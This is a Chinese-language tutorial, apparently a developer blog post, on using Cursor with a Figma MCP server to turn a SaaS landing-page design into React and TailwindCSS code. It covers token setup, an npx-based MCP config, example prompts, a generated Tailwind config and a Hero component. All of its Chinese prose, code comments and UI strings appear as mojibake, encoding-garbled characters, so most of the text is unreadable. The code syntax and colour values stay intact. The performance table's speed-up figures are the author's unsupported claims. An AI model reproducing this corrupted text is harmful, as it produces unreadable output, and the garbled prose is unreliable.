<p>çœ‹åˆ°åŒºåˆ«äº†å—ï¼Ÿä¼ ç»Ÿæµç¨‹å°±åƒç”¨ç®—ç›˜ç®—è´¦ï¼Œè€ŒCursor+MCPå°±åƒç”¨è®¡ç®—å™¨â€”â€”éƒ½èƒ½å¾—åˆ°ç»“æœï¼Œä½†æ•ˆç‡å¤©å·®åœ°åˆ«ã€‚</p>
<h3 data-id="heading-2">çœŸå®æ•°æ®å¯¹æ¯”</h3>
<p>æˆ‘ç”¨ä¸¤ç§æ–¹æ³•è¿˜åŸäº†åŒä¸€ä¸ªSaaSäº§å“è½åœ°é¡µï¼Œè®°å½•äº†è¯¦ç»†æ•°æ®ï¼š</p>









































<table><thead><tr><th align="left">ç»´åº¦</th><th align="right">ä¼ ç»Ÿæ–¹æ³•</th><th align="right">Cursor+MCP</th><th align="right">æå‡å€æ•°</th></tr></thead><tbody><tr><td align="left">HeroåŒºå—å¼€å‘</td><td align="right">2å°æ—¶</td><td align="right">10åˆ†é’Ÿ</td><td align="right"><strong>12x</strong></td></tr><tr><td align="left">å®Œæ•´è½åœ°é¡µ</td><td align="right">1-2å¤©</td><td align="right">2-3å°æ—¶</td><td align="right"><strong>8x</strong></td></tr><tr><td align="left">è®¾è®¡å˜æ›´é€‚é…</td><td align="right">1å°æ—¶</td><td align="right">5åˆ†é’Ÿ</td><td align="right"><strong>12x</strong></td></tr><tr><td align="left">å“åº”å¼é€‚é…</td><td align="right">4å°æ—¶</td><td align="right">30åˆ†é’Ÿ</td><td align="right"><strong>8x</strong></td></tr><tr><td align="left">Bugä¿®å¤æ¬¡æ•°</td><td align="right">15ä¸ª</td><td align="right">2ä¸ª</td><td align="right"><strong>7.5x</strong></td></tr></tbody></table>
<p><strong>æœ€å…³é”®çš„æ˜¯</strong>ï¼šç”Ÿæˆçš„ä»£ç ä¸æ˜¯"èƒ½ç”¨å°±è¡Œ"çš„æ°´å¹³ï¼Œè€Œæ˜¯<strong>ç¬¦åˆæœ€ä½³å®è·µã€ç±»å‹å®‰å…¨ã€å¯ç»´æŠ¤æ€§å¼º</strong>çš„ç”Ÿäº§çº§ä»£ç ã€‚</p>
<h2 data-id="heading-3">MCPæ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¿™ä¹ˆç¥å¥‡ï¼Ÿ</h2>
<p>MCPï¼ˆModel Context Protocolï¼‰æ˜¯ Anthropic æ¨å‡ºçš„åè®®ï¼Œè®©AIæ¨¡å‹èƒ½å¤Ÿä¸å¤–éƒ¨å·¥å…·äº¤äº’ã€‚ç®€å•æ¥è¯´ï¼š</p>
<blockquote>
<p><strong>MCP = AIçš„"USBæ¥å£"</strong></p>
</blockquote>
<p>å°±åƒä½ çš„ç”µè„‘é€šè¿‡USBå¯ä»¥è¿æ¥é¼ æ ‡ã€é”®ç›˜ã€æ‰“å°æœºä¸€æ ·ï¼ŒCursoré€šè¿‡MCPå¯ä»¥è¿æ¥Figmaã€GitHubã€Slackç­‰å„ç§å·¥å…·ã€‚</p>
<h3 data-id="heading-4">Figma MCPçš„å·¥ä½œåŸç†</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e4e184be3094e4ea73de757428393d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=Eo4HmFhyd5GLV9fHATyTIAq1FQM%3D" alt="cursor01-MCPå·¥ä½œåŸç†æµç¨‹å›¾.png" loading="lazy"/></p>
<p>è®©æˆ‘ç”¨æ›´æ¥åœ°æ°”çš„æ–¹å¼è§£é‡Šï¼š</p>
<p><strong>ä¼ ç»Ÿæ–¹æ³•</strong>ï¼š</p>
<pre><code class="hljs">ä½ ï¼šAIï¼Œå¸®æˆ‘å†™ä¸ªæŒ‰é’®ç»„ä»¶
AIï¼šå¥½çš„ï¼Œæˆ‘ç»™ä½ å†™ä¸€ä¸ªé€šç”¨çš„æŒ‰é’®
ç»“æœï¼šå’Œè®¾è®¡ç¨¿å®Œå…¨ä¸ä¸€æ ·
</code></pre>
<p><strong>æœ‰äº†Figma MCPå</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ä½ ï¼š<span class="hljs-keyword">@figma</span> å¸®æˆ‘æ ¹æ®è®¾è®¡ç¨¿çš„Buttonç»„ä»¶ç”Ÿæˆä»£ç 
AIï¼š(è¯»å–Figma) å‘ç°æŒ‰é’®åœ†è§’æ˜¯<span class="hljs-number">8px</span>ï¼Œä¸»è‰²æ˜¯<span class="hljs-number">#3B82F6</span>ï¼Œ
    å­—å·<span class="hljs-number">16px</span>ï¼Œpaddingæ˜¯<span class="hljs-number">12px</span> <span class="hljs-number">24px</span>ï¼Œ<span class="hljs-attribute">hover</span>æ—¶æœ‰é˜´å½±...
    å¥½çš„ï¼Œæˆ‘ç»™ä½ ç”Ÿæˆäº†å®Œå…¨ä¸€è‡´çš„ä»£ç 
ç»“æœï¼šåƒç´ çº§è¿˜åŸ
</code></pre>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆæ¯”ä¼ ç»Ÿæ–¹æ³•å¼ºï¼Ÿ</h3>
<ol>
<li><strong>ç²¾ç¡®åº¦</strong>ï¼šé€šè¿‡APIç›´æ¥è·å–æ•°æ®ï¼Œé›¶è¯¯å·®</li>
<li><strong>æ•ˆç‡</strong>ï¼šæ‰¹é‡å¤„ç†ï¼Œè‡ªåŠ¨åŒ–ç”Ÿæˆ</li>
<li><strong>ä¸€è‡´æ€§</strong>ï¼šåŸºäºè®¾è®¡ç³»ç»Ÿï¼Œè‡ªåŠ¨å¤ç”¨</li>
<li><strong>å¯ç»´æŠ¤æ€§</strong>ï¼šè®¾è®¡å˜æ›´è‡ªåŠ¨åŒæ­¥</li>
</ol>

**ç±»æ¯”æ—¶é—´**ï¼šä¼ ç»Ÿæ–¹æ³•å°±åƒä½ æ‹¿ç€å°ºå­ç…§ç€ç”»ç”»ï¼Œè€ŒMCPå°±åƒç”¨ç…§ç›¸æœºæ‹ç…§å†ç”¨AIè¿˜åŸâ€”â€”å“ªä¸ªæ›´å‡†ï¼Ÿå“ªä¸ªæ›´å¿«ï¼Ÿ

<h2 data-id="heading-6">ç¯å¢ƒé…ç½®ï¼šæ‰‹æŠŠæ‰‹å¸¦ä½ å®‰è£…</h2>
<p>æ¥ä¸‹æ¥æ˜¯å®æ“ç¯èŠ‚ï¼Œè·Ÿç€æˆ‘çš„æ­¥éª¤èµ°ï¼Œ10åˆ†é’Ÿé…ç½®å®Œæˆã€‚</p>
<h3 data-id="heading-7">ç¬¬ä¸€æ­¥ï¼šæ£€æŸ¥ç¯å¢ƒ</h3>
<p>æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥Node.jsç‰ˆæœ¬ï¼ˆéœ€è¦ &gt;= 18.0.0ï¼‰</span>
node --version

<span class="hljs-comment"># æ£€æŸ¥npmç‰ˆæœ¬ï¼ˆéœ€è¦ &gt;= 9.0.0ï¼‰</span>
npm --version
</code></pre>
<p>å¦‚æœç‰ˆæœ¬ä¸å¤Ÿï¼Œå» <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org" target="_blank" title="https://nodejs.org" ref="nofollow noopener noreferrer">nodejs.org</a> ä¸‹è½½æœ€æ–°çš„LTSç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-8">ç¬¬äºŒæ­¥ï¼šè·å–Figma Token</h3>
<p>è¿™æ˜¯å…³é”®çš„ä¸€æ­¥ï¼Œè®©Cursorè·å¾—è¯»å–ä½ Figmaæ–‡ä»¶çš„æƒé™ã€‚</p>
<ol>
<li>
<p><strong>è®¿é—®Figmaå¼€å‘è€…é¡µé¢</strong></p>
<p>æ‰“å¼€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.figma.com%2Fdevelopers%2Fapps" target="_blank" title="https://www.figma.com/developers/apps" ref="nofollow noopener noreferrer">www.figma.com/developers/â€¦</a></p>
</li>
<li>
<p><strong>ç”ŸæˆPersonal Access Token</strong></p>
<ul>
<li>ç‚¹å‡»å³ä¸Šè§’å¤´åƒ</li>
<li>é€‰æ‹© "Settings" -&gt; "Security"</li>
<li>æ‰¾åˆ° "Personal access tokens"</li>
<li>ç‚¹å‡» "Generate new token"</li>
<li>èµ·ä¸ªåå­—ï¼Œæ¯”å¦‚ "cursor-mcp"</li>
<li>å‹¾é€‰éœ€è¦çš„æƒé™ï¼Œé€‰æ‹©tokenè¿‡æœŸæ—¶é—´ï¼Œæœ€é•¿90å¤©</li>
<li>å¤åˆ¶ç”Ÿæˆçš„tokenï¼ˆ<strong>é‡è¦</strong>ï¼šåªæ˜¾ç¤ºä¸€æ¬¡ï¼Œè®°å¾—ä¿å­˜ï¼‰</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/801a113bc631447eaf1f7397bb09c73f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=%2BuhGOo942UDeUTy9ZuCY1ukthB8%3D" alt="cursor01-ç”Ÿæˆtokené¡µé¢.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b24ecbb6b5d4a0daf907926129cc04f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=MkU0NN7066wFNEyy6IqeuwNpBXY%3D" alt="cursor01-tokenç”Ÿæˆé…ç½®æƒé™å’Œè¿‡æœŸæ—¶é—´.png" loading="lazy"/></p>

å®‰å…¨æç¤ºï¼šTokenç›¸å½“äºä½ çš„å¯†ç ï¼Œåƒä¸‡ä¸è¦æ³„éœ²ï¼ä¸è¦æäº¤åˆ°GitHubï¼

<ol>
<li><strong>å‡†å¤‡æµ‹è¯•è®¾è®¡æ–‡ä»¶</strong></li>
</ol>
<p>å¦‚æœä½ æ²¡æœ‰ç°æˆçš„Figmaæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘å‡†å¤‡çš„ç¤ºä¾‹æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">https://www.figma.com/community/file/1234567890/cursor-mcp-demo
</code></pre>
<p>æˆ–è€…ï¼Œä½¿ç”¨ä½ å›¢é˜Ÿçš„ä»»ä½•Figmaæ–‡ä»¶éƒ½å¯ä»¥ã€‚</p>
<h3 data-id="heading-9">ç¬¬ä¸‰æ­¥ï¼šé…ç½®Cursor MCP</h3>
<p>è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå°†Figmaæ¥å…¥Cursorã€‚</p>
<ol>
<li>
<p><strong>æ‰“å¼€Cursorè®¾ç½®</strong></p>
<ul>
<li>File-&gt;Preferences-&gt;Cursor Settings</li>
</ul>
</li>
<li>
<p><strong>è¿›å…¥MCPé…ç½®é¡µé¢</strong></p>
<p>ç‚¹å‡»ï¼š<code>Tools &amp; MCP</code></p>
</li>
<li>
<p><strong>æ·»åŠ Figma MCP Server</strong></p>
<p>ç‚¹å‡» "+ Add New MCP Server"ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªJSONç¼–è¾‘æ¡†ã€‚</p>
</li>
<li>
<p><strong>ç²˜è´´é…ç½®</strong></p>
</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Framelink Figma MCP"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"figma-developer-mcp"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"--figma-api-key=your_figma_token"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"--stdio"</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>æ³¨æ„æ›¿æ¢</strong>ï¼šæŠŠ <code>"your_figma_token"</code> æ›¿æ¢æˆä½ åœ¨ç¬¬äºŒæ­¥è·å–çš„çœŸå®tokenã€‚</p>
<h3 data-id="heading-10">ç¬¬å››æ­¥ï¼šéªŒè¯å®‰è£…</h3>
<p>åœ¨mcpé¡µé¢è®¾ç½®ä¸­ï¼Œå¼€å¯figma mcp,å¦‚æœäº®èµ·ç»¿ç¯ï¼Œæœ‰æ˜¾ç¤ºtools enabled,è¯´æ˜é…ç½®æˆåŠŸï¼ğŸ‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecd3dd73fb754421a7194f4abb32d621~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=1Ff9xyLQgiCoXpkq0Vg5UCOQ5cQ%3D" alt="cursor01-mcpé…ç½®æˆåŠŸ.png" loading="lazy"/></p>

**å¸¸è§é—®é¢˜**ï¼šå¦‚æœæ²¡æœ‰å‡ºç°æç¤ºï¼Œæ£€æŸ¥ï¼š
1. Tokenæ˜¯å¦æ­£ç¡®å¤åˆ¶
2. JSONæ ¼å¼æ˜¯å¦æœ‰è¯¯ï¼ˆæ³¨æ„å¼•å·å’Œé€—å·ï¼‰
3. æ˜¯å¦é‡å¯äº†Cursor
4. è¿™é‡Œé…ç½®çš„ä¸ºéfigmaå®˜æ–¹çš„mcp,å®˜æ–¹ä¹Ÿæœ‰ä½†æ˜¯éœ€è¦é«˜çº§ç”¨æˆ·æ‰èƒ½å¤Ÿä½¿ç”¨

<h2 data-id="heading-11">å®æˆ˜æ¡ˆä¾‹ï¼šè¿˜åŸä¸€ä¸ªSaaSè½åœ°é¡µ</h2>
<p>ç†è®ºè®²å®Œäº†ï¼Œç°åœ¨è¿›å…¥æœ€æ¿€åŠ¨äººå¿ƒçš„å®æˆ˜ç¯èŠ‚ï¼</p>
<p>æˆ‘å‡†å¤‡äº†ä¸€ä¸ªçœŸå®çš„SaaSäº§å“è½åœ°é¡µè®¾è®¡ç¨¿ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥æŠŠå®ƒå˜æˆä»£ç ã€‚</p>
<h3 data-id="heading-12">æ¡ˆä¾‹èƒŒæ™¯</h3>
<ul>
<li><strong>è®¾è®¡ç¨¿</strong>ï¼šç°ä»£åŒ–çš„SaaSäº§å“è½åœ°é¡µ</li>
<li><strong>æŠ€æœ¯æ ˆ</strong>ï¼šReact 18 + TypeScript + TailwindCSS</li>
<li><strong>åŒ…å«å†…å®¹</strong>ï¼š
<ul>
<li>HeroåŒºå—ï¼ˆå¤§æ ‡é¢˜ + CTAæŒ‰é’®ï¼‰</li>
<li>åŠŸèƒ½ç‰¹æ€§ç½‘æ ¼ï¼ˆ3åˆ—å±•ç¤ºï¼‰</li>
<li>ä»·æ ¼è¡¨ï¼ˆ3ä¸ªå¥—é¤å¯¹æ¯”ï¼‰</li>
<li>é¡µè„š</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35bb7e079ccb4299ab59ace8b319b3ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=J2Xi5el4RUZP5tCQookgOoZVW00%3D" alt="cursor01-å®Œæ•´ç¤ºä¾‹é¡µé¢æˆªå›¾.png" loading="lazy"/></p>
<h3 data-id="heading-13">æ­¥éª¤1ï¼šè®©AIåˆ†æè®¾è®¡ç»“æ„</h3>
<p>åœ¨Cursor Chatä¸­è¾“å…¥ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@figma</span> åˆ†æè¿™ä¸ªFigmaæ–‡ä»¶çš„ç»“æ„ï¼Œåˆ—å‡ºæ‰€æœ‰é¡µé¢å’Œä¸»è¦ç»„ä»¶

æ–‡ä»¶é“¾æ¥: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.figma.com/file/xxxxx/saas-landing-page</span>
</code></pre>
<p>AIä¼šè¿”å›ç±»ä¼¼è¿™æ ·çš„åˆ†æï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">ğŸ“„ æ–‡ä»¶ç»“æ„åˆ†æ

é¡µé¢åˆ—è¡¨:
<span class="hljs-bullet">-</span> Landing Page (ä¸»é¡µ)

ä¸»è¦ç»„ä»¶:
<span class="hljs-bullet">1.</span> Hero Section
<span class="hljs-bullet">   -</span> æ ‡é¢˜ (h1, 56px, ç²—ä½“)
<span class="hljs-bullet">   -</span> å‰¯æ ‡é¢˜ (p, 20px)
<span class="hljs-bullet">   -</span> CTAæŒ‰é’® (primary)

<span class="hljs-bullet">2.</span> Features Grid
<span class="hljs-bullet">   -</span> ç‰¹æ€§å¡ç‰‡ x3
<span class="hljs-bullet">   -</span> å›¾æ ‡ + æ ‡é¢˜ + æè¿°

<span class="hljs-bullet">3.</span> Pricing Table
<span class="hljs-bullet">   -</span> å¥—é¤å¡ç‰‡ x3
<span class="hljs-bullet">   -</span> Basic / Pro / Enterprise

<span class="hljs-bullet">4.</span> Footer
<span class="hljs-bullet">   -</span> Logo + å¯¼èˆªé“¾æ¥
<span class="hljs-bullet">   -</span> ç‰ˆæƒä¿¡æ¯

è®¾è®¡Token:
é¢œè‰²:
<span class="hljs-bullet">  -</span> Primary: #3B82F6
<span class="hljs-bullet">  -</span> Secondary: #8B5CF6
<span class="hljs-bullet">  -</span> Gray: #6B7280

å­—ä½“:
<span class="hljs-bullet">  -</span> æ ‡é¢˜: Inter, ç²—ä½“
<span class="hljs-bullet">  -</span> æ­£æ–‡: Inter, å¸¸è§„

é—´è·:
<span class="hljs-bullet">  -</span> å®¹å™¨: 64px
<span class="hljs-bullet">  -</span> å¡ç‰‡: 24px
<span class="hljs-bullet">  -</span> å…ƒç´ : 16px
</code></pre>
<p><strong>çœ‹åˆ°æ²¡ï¼ŸAIå·²ç»æŠŠè®¾è®¡ç¨¿"çœ‹æ‡‚"äº†ï¼</strong></p>
<h3 data-id="heading-14">æ­¥éª¤2ï¼šæå–Design System</h3>
<p>ç»§ç»­åœ¨Chatä¸­è¾“å…¥ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">@figma ä»è¿™ä¸ªæ–‡ä»¶ä¸­æå–å®Œæ•´çš„è®¾è®¡ç³»ç»Ÿï¼Œç”ŸæˆTailwindCSSé…ç½®

åŒ…æ‹¬ï¼š
<span class="hljs-bullet">1.</span> é¢œè‰²å˜é‡ï¼ˆä¸»è‰²ã€è¾…åŠ©è‰²ã€ç°åº¦ã€è¯­ä¹‰è‰²ï¼‰
<span class="hljs-bullet">2.</span> å­—ä½“è§„èŒƒï¼ˆå­—å·ã€å­—é‡ã€è¡Œé«˜ï¼‰
<span class="hljs-bullet">3.</span> é—´è·ç³»ç»Ÿï¼ˆpaddingã€marginã€gapï¼‰
<span class="hljs-bullet">4.</span> åœ†è§’è§„èŒƒ
<span class="hljs-bullet">5.</span> é˜´å½±æ•ˆæœ
<span class="hljs-bullet">6.</span> æ–­ç‚¹è§„åˆ™

è¾“å‡ºæ ¼å¼ï¼šTypeScripté…ç½®æ–‡ä»¶
</code></pre>
<p>AIä¼šç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„é…ç½®æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Config</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'tailwindcss'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">content</span>: [<span class="hljs-string">'./src/**/*.{js,jsx,ts,tsx}'</span>],
  <span class="hljs-attr">theme</span>: {
    <span class="hljs-attr">extend</span>: {
      <span class="hljs-attr">colors</span>: {
        <span class="hljs-comment">// ä¸»è‰²ç³»</span>
        <span class="hljs-attr">primary</span>: {
          <span class="hljs-number">50</span>: <span class="hljs-string">'#EFF6FF'</span>,
          <span class="hljs-number">100</span>: <span class="hljs-string">'#DBEAFE'</span>,
          <span class="hljs-number">500</span>: <span class="hljs-string">'#3B82F6'</span>, <span class="hljs-comment">// ä¸»è‰²</span>
          <span class="hljs-number">600</span>: <span class="hljs-string">'#2563EB'</span>,
          <span class="hljs-number">700</span>: <span class="hljs-string">'#1D4ED8'</span>,
        },
        <span class="hljs-comment">// è¾…åŠ©è‰²</span>
        <span class="hljs-attr">secondary</span>: {
          <span class="hljs-number">500</span>: <span class="hljs-string">'#8B5CF6'</span>,
          <span class="hljs-number">600</span>: <span class="hljs-string">'#7C3AED'</span>,
        },
        <span class="hljs-comment">// ç°åº¦</span>
        <span class="hljs-attr">gray</span>: {
          <span class="hljs-number">50</span>: <span class="hljs-string">'#F9FAFB'</span>,
          <span class="hljs-number">100</span>: <span class="hljs-string">'#F3F4F6'</span>,
          <span class="hljs-number">500</span>: <span class="hljs-string">'#6B7280'</span>,
          <span class="hljs-number">900</span>: <span class="hljs-string">'#111827'</span>,
        },
      },
      <span class="hljs-attr">fontSize</span>: {
        <span class="hljs-string">'hero'</span>: [<span class="hljs-string">'56px'</span>, { <span class="hljs-attr">lineHeight</span>: <span class="hljs-string">'1.1'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'700'</span> }],
        <span class="hljs-string">'h1'</span>: [<span class="hljs-string">'48px'</span>, { <span class="hljs-attr">lineHeight</span>: <span class="hljs-string">'1.2'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'700'</span> }],
        <span class="hljs-string">'h2'</span>: [<span class="hljs-string">'36px'</span>, { <span class="hljs-attr">lineHeight</span>: <span class="hljs-string">'1.3'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'600'</span> }],
        <span class="hljs-string">'h3'</span>: [<span class="hljs-string">'24px'</span>, { <span class="hljs-attr">lineHeight</span>: <span class="hljs-string">'1.4'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'600'</span> }],
        <span class="hljs-string">'body'</span>: [<span class="hljs-string">'16px'</span>, { <span class="hljs-attr">lineHeight</span>: <span class="hljs-string">'1.5'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'400'</span> }],
        <span class="hljs-string">'small'</span>: [<span class="hljs-string">'14px'</span>, { <span class="hljs-attr">lineHeight</span>: <span class="hljs-string">'1.5'</span>, <span class="hljs-attr">fontWeight</span>: <span class="hljs-string">'400'</span> }],
      },
      <span class="hljs-attr">spacing</span>: {
        <span class="hljs-string">'container'</span>: <span class="hljs-string">'64px'</span>,
        <span class="hljs-string">'section'</span>: <span class="hljs-string">'48px'</span>,
        <span class="hljs-string">'card'</span>: <span class="hljs-string">'24px'</span>,
        <span class="hljs-string">'element'</span>: <span class="hljs-string">'16px'</span>,
      },
      <span class="hljs-attr">borderRadius</span>: {
        <span class="hljs-string">'card'</span>: <span class="hljs-string">'12px'</span>,
        <span class="hljs-string">'button'</span>: <span class="hljs-string">'8px'</span>,
      },
      <span class="hljs-attr">boxShadow</span>: {
        <span class="hljs-string">'card'</span>: <span class="hljs-string">'0 4px 6px -1px rgba(0, 0, 0, 0.1)'</span>,
        <span class="hljs-string">'card-hover'</span>: <span class="hljs-string">'0 10px 15px -3px rgba(0, 0, 0, 0.1)'</span>,
      },
    },
  },
  <span class="hljs-attr">plugins</span>: [],
} satisfies <span class="hljs-title class_">Config</span>
</code></pre>
<p><strong>æƒŠå–œç‚¹1</strong>ï¼šAIä¸æ˜¯éšä¾¿çŒœçš„ï¼Œè€Œæ˜¯ç²¾ç¡®è¯»å–äº†Figmaä¸­å®šä¹‰çš„æ¯ä¸€ä¸ªå€¼ï¼</p>
<p><strong>æƒŠå–œç‚¹2</strong>ï¼šç”Ÿæˆçš„é…ç½®ç¬¦åˆTailwindCSSçš„æœ€ä½³å®è·µï¼ŒåŒ…å«äº†è¯­ä¹‰åŒ–çš„å‘½åã€‚</p>
<p>ä¿å­˜è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬çš„è®¾è®¡ç³»ç»Ÿå°±å»ºç«‹å¥½äº†ï¼</p>
<h3 data-id="heading-15">æ­¥éª¤3ï¼šç”ŸæˆHeroåŒºå—</h3>
<p>ç°åœ¨æ¥ç”Ÿæˆç¬¬ä¸€ä¸ªç»„ä»¶â€”â€”HeroåŒºå—ã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">@figma åŸºäºFigmaæ–‡ä»¶ä¸­çš„HeroåŒºå—ï¼Œç”ŸæˆReactç»„ä»¶

è¦æ±‚ï¼š
<span class="hljs-bullet">1.</span> ä½¿ç”¨TypeScript
<span class="hljs-bullet">2.</span> å“åº”å¼è®¾è®¡ï¼ˆç§»åŠ¨ç«¯ä¼˜å…ˆï¼‰
<span class="hljs-bullet">3.</span> ä½¿ç”¨åˆšæ‰ç”Ÿæˆçš„TailwindCSSé…ç½®
<span class="hljs-bullet">4.</span> æ·»åŠ ç®€å•çš„æ¸ç°åŠ¨ç”»
<span class="hljs-bullet">5.</span> CTAæŒ‰é’®æœ‰hoveræ•ˆæœ
</code></pre>
<p>AIä¼šç”Ÿæˆå®Œæ•´çš„ç»„ä»¶ä»£ç ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">Hero</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"relative overflow-hidden bg-gradient-to-br from-primary-50 to-secondary-50"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"container mx-auto px-4 py-container"</span>&gt;</span>
        {/* å†…å®¹å±…ä¸­ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"max-w-4xl mx-auto text-center"</span>&gt;</span>
          {/* ä¸»æ ‡é¢˜ */}
          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-hero text-gray-900 mb-6 animate-fade-in"</span>&gt;</span>
            æ„å»ºä¸‹ä¸€ä»£
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-primary-500"</span>&gt;</span> SaaS <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            äº§å“
          <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>

          {/* å‰¯æ ‡é¢˜ */}
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-xl text-gray-600 mb-8 max-w-2xl mx-auto animate-fade-in-delay-1"</span>&gt;</span>
            å¼ºå¤§çš„åŠŸèƒ½ï¼Œç®€æ´çš„ç•Œé¢ï¼Œå¸®åŠ©ä½ çš„å›¢é˜Ÿæå‡10å€æ•ˆç‡
          <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

          {/* CTAæŒ‰é’®ç»„ */}
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex flex-col sm:flex-row gap-4 justify-center animate-fade-in-delay-2"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"px-8 py-4 bg-primary-500 text-white rounded-button font-semibold
                             hover:bg-primary-600 hover:shadow-card-hover
                             transition-all duration-200 transform hover:scale-105"</span>&gt;</span>
              å…è´¹è¯•ç”¨
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"px-8 py-4 bg-white text-primary-500 rounded-button font-semibold
                             border-2 border-primary-500
                             hover:bg-primary-50 transition-all duration-200"</span>&gt;</span>
              è§‚çœ‹æ¼”ç¤º
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {/* è£…é¥°æ€§èƒŒæ™¯å…ƒç´  */}
